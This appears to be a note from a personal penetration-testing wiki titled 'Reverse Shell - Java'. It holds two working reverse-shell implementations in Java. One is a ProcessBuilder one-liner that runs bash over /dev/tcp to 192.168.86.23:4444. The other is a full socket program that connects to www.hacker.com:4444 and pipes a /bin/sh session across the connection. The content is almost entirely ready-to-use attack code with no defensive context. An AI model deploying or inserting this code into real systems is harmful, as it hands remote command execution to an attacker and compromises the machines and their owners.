---
title: "Reverse Shell - Java"
created: 2022-05-29T02:37:31.423-05:00
modified: 2022-05-29T02:41:42.891-05:00
parent: "[[Reverse Shells]]"
children: []
---
[[Reverse Shells|Reverse Shell]] implemented in [[Java]]
# Implementation \#1

> [!expand]- Click here to expand...
> ```
> new ProcessBuilder()
> 		.command("bash", "-c", "/bin/bash -i >& /dev/tcp/192.168.86.23/4444 0>&1")
> 		.start();
> ```
# Implementation \#2

> [!expand]- Click here to expand...
> ```java
> String host = "www.hacker.com";
> int port = 4444;
> String cmd = "/bin/sh";
>
> Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
>
> try (Socket s = new Socket(host, port);
>      InputStream  pInputStream  = p.getInputStream();
>      InputStream  pErrorStream  = p.getErrorStream();
>      InputStream  sInputStream  = s.getInputStream();
>      OutputStream pOutputStream = p.getOutputStream();
>      OutputStream sOutputStream = s.getOutputStream()) {
>
>     while (!s.isClosed()) {
>         while (pInputStream.available() > 0) sOutputStream.write(pInputStream.read());
>         while (pErrorStream.available() > 0) sOutputStream.write(pErrorStream.read());
>         while (sInputStream.available() > 0) pOutputStream.write(sInputStream.read());
>         sOutputStream.flush();
>         pOutputStream.flush();
>         Thread.sleep(50);
>         try {
>             p.exitValue();
>             break;
>         } catch (Exception e) { }
>     }
> } finally {
>     p.destroy();
> }
> ```
